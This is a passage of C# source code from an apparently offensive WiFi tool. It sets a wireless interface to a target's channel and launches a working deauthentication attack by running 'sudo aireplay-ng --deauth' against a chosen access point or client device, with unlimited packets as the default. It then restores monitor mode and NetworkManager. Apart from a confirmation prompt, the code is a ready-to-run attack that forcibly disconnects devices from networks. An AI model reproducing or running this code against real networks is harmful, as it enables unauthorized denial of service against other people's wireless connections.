            var parentAp = devices.FirstOrDefault(d => d.MacAddress == apBssid);
            if (parentAp != null)
            {
                targetChannel = parentAp.Channel;
            }
            else
            {
                targetChannel = ModernUI.Prompt("Enter Channel for this network (AP not found in scan)");
            }
        }
        else
        {
            apBssid = targetDevice.MacAddress;
        }

        string packetCountStr = ModernUI.Prompt("Number of deauth packets (0=infinite)", "0");
        int packetCount = int.Parse(packetCountStr);
        string deauthCount = packetCount == 0 ? "0" : packetCount.ToString();

        ModernUI.DrawBox("DEAUTH ATTACK CONFIG", () =>
        {
            Console.WriteLine($"   Target:        {targetDevice.MacAddress} ({targetDevice.Type})");
            Console.WriteLine($"   Access Point:  {apBssid}");
            Console.WriteLine($"   Target Channel:{targetChannel}");
            Console.WriteLine($"   Packets:       {(packetCount == 0 ? "Infinite" : packetCount.ToString())}");
            Console.WriteLine($"   Interface:     {interfaceName}");
        });
        Console.WriteLine();
        ModernUI.Print("WARNING: This will disconnect the target from the network!", ModernUI.MsgType.Warning);
        string confirm = ModernUI.Prompt("Start attack? (y/n)", "n");

        if (confirm.ToLower() != "y")
        {
            ModernUI.Print("Attack cancelled.", ModernUI.MsgType.Info);
            if (enableMonitor.ToLower() == "y") await RestoreNetworkSettings(interfaceName);
            ModernUI.Pause();
            return;
        }

        try
        {
            ModernUI.Print($"Locking interface {interfaceName} to Channel {targetChannel}...", ModernUI.MsgType.Wait);
            var setCh = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "sudo",
                    Arguments = $"iwconfig {interfaceName} channel {targetChannel}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            setCh.Start();
            setCh.WaitForExit();
            await Task.Delay(500);
        }
        catch { ModernUI.Print("Warning: Could not set channel automatically.", ModernUI.MsgType.Warning); }

        ModernUI.Print("Starting deauth attack (Ctrl+C to stop)...", ModernUI.MsgType.Wait);

        try
        {
            string arguments;
            if (targetDevice.Type == "Client Device")
            {
                arguments = $"--deauth {deauthCount} -a {apBssid} -c {targetDevice.MacAddress} {interfaceName} --ignore-negative-one";
            }
            else
            {
                arguments = $"--deauth {deauthCount} -a {targetDevice.MacAddress} {interfaceName} --ignore-negative-one";
            }

            var deauthProcess = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "sudo",
                    Arguments = $"aireplay-ng {arguments}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            deauthProcess.OutputDataReceived += (sender, e) => { if (!string.IsNullOrEmpty(e.Data)) Console.WriteLine($"   {ModernUI.C_GRAY}[AIREPLAY]{ModernUI.C_RESET} {e.Data}"); };
            deauthProcess.Start();
            deauthProcess.BeginOutputReadLine();
            while (!token.IsCancellationRequested && !deauthProcess.HasExited) await Task.Delay(500);
            if (!deauthProcess.HasExited) { deauthProcess.Kill(); ModernUI.Print("\nAttack stopped.", ModernUI.MsgType.Info); }
            else ModernUI.Print("\nAttack completed.", ModernUI.MsgType.Success);
        }
        catch (Exception ex) { ModernUI.Print($"Attack error: {ex.Message}", ModernUI.MsgType.Error); }

        if (enableMonitor.ToLower() == "y") await RestoreNetworkSettings(interfaceName);
        ModernUI.Pause();
    }

    /// <summary>Restores network settings after WiFi deauth attack.</summary>
    private static async Task RestoreNetworkSettings(string? interfaceName = null)
    {
        try
        {
            ModernUI.Print("Restoring network settings...", ModernUI.MsgType.Wait);
            if (!string.IsNullOrEmpty(interfaceName))
            {
                var stopProcess = new Process()
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "sudo",
                        Arguments = $"airmon-ng stop {interfaceName}",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                stopProcess.Start();
                await stopProcess.StandardOutput.ReadToEndAsync();
                stopProcess.WaitForExit();
            }

            var nmProcess = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "sudo",
                    Arguments = "systemctl restart NetworkManager",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            nmProcess.Start();
            await nmProcess.StandardOutput.ReadToEndAsync();
            nmProcess.WaitForExit();
            ModernUI.Print("NetworkManager restarted.", ModernUI.MsgType.Success);
        }
        catch (Exception ex) { ModernUI.Print($"Error restoring settings: {ex.Message}", ModernUI.MsgType.Warning); }
    }
}